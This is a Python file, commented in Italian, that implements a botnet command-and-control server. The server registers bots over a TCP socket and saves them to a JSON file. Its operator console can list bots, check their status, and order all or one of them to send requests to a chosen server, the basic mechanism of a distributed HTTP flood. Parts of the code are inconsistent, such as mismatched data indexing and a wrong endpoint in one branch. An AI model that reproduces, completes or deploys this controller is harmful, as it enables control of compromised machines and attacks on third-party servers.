import concurrent.futures
import socket
import json
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor
from time import sleep

import requests


class CC:
    # lista dei bot attivi con le relative porte
    activeBotSf = True
    activeBot = {}

    # costruttore
    def __init__(self):
        self.loadData()

    # aggiunge un bot alle liste
    def addBot(self, ip, data):
        while (not self.activeBotSf):
            continue
        self.activeBotSf = False
        self.activeBot[ip] = json.loads(data)
        self.activeBotSf = True
        return True

    # imposta lo stato di attività del bot
    def listen(self, event):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('', 49171))
            s.settimeout(2)
            print("Server is listening...")
            while True and (not event.is_set()):
                try:
                    s.listen()
                    res = True
                    conn, addr = s.accept()
                    data = conn.recv(1024).decode()
                    data = data.split(" ")
                    res = self.addBot(data[0], data[1])
                    if res:
                        data = "bot registrated succesfully"
                        conn.send(data.encode())
                    else:
                        data = "bot not registrated"
                        conn.send(data.encode())
                    conn.close()
                except Exception as e:
                    continue
        except Exception as e:
            print("\nListening errors:", e)
            return
        finally:
            conn.close()
            s.close()

    def checkBot(self, target=""):
        print("Controllo bot attivi...")
        if target == "":
            rm = []
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + str(v['http']) + "/status"
                    response = requests.get(url)
                    res = response.json()
                except Exception as e:
                    print(k, " is not reachable over http port: ", e)
        else:
            try:
                url = "http://" + target + ":" + str(self.activeBot[target]['http']) + "/status"
                response = requests.get(url)
                res = response.json()
            except Exception as e:
                print(target, " is not reachable over http port: ", e)
        print("Controllo terminato")

    def makeHTTPRequest(self, server, target=""):
        print("Invio richiesta...")
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + v[0][0] + "/get"
                    response = requests.post(url, json={"url": server})
                    res = response.json()
                    self.activeBot[k] = [v[0], res["status"]]
                except Exception as e:
                    print(e)
        else:
            port = self.activeBot[target][0]
            try:
                url = "http://" + target + ":" + port[0] + "/status"
                response = requests.post(url, json={"url": server})
                res = response.json()
                self.activeBot[target] = [port, res["status"]]
            except Exception as e:
                print(e)
        print("Richiesta inviata")

    def command(self, event):
        sleep(1)
        while (True):
            comando = input("C&C@command: ")
            if comando == "stop":
                event.set()
                return
            if comando == "ls":
                print("Ip\t\thttp\t\tftp")
                for k, v in self.activeBot.items():
                    print(f"{k}\t{v['http']}\t\t{v['ftp']}")
            if comando == "ls -s":
                print("Ip\t\thttp\t\tftp\t\tstatus")
                for k, v in self.activeBot.items():
                    print(f"{k}\t{v['http']}\t\t{v['ftp']}\t\t{v['status']}")
            if comando.startswith("get"):
                c = comando.split(" ")
                if len(c) == 1 or len(c) == 2:
                    print("Command not found")
                if c[2] == "all":
                    self.makeHTTPRequest(c[1])
                elif c[2] in self.activeBot:
                    self.makeHTTPRequest(c[1], target=c[2])
                else:
                    print("Command not found. Correct command [get server all | get server target(ip)]")
            if comando.startswith("ck"):
                c = comando.split(" ")
                if len(c) == 1:
                    print("Command not found")
                if c[1] == "all":
                    self.checkBot()
                elif c[1] in self.activeBot:
                    self.checkBot(target=c[1])
                else:
                    print("Command not found. Correct command [ck all | ck target(ip)]")

    # load activeBot from file
    def loadData(self):
        with open("./activeBot.json", 'r') as f:
            self.activeBot = json.load(f)

    # write activeBot on file
    def writeData(self):
        with open("./activeBot.json", 'w') as f:
            json.dump(self.activeBot, f, indent=2)


# avvia il C&C
def startCC():
    print("Starting C&C...")
    cc = CC()
    event = Event()
    task = []
    with ThreadPoolExecutor(max_workers=2) as exec:
        task.append(exec.submit(cc.listen, event))
        task.append(exec.submit(cc.command, event))
        done, not_done = concurrent.futures.wait(task, return_when=concurrent.futures.FIRST_COMPLETED)
        exec.shutdown(wait=False)
    cc.writeData()
    print("C&C stopped")
    return


if __name__ == "__main__":
    startCC()
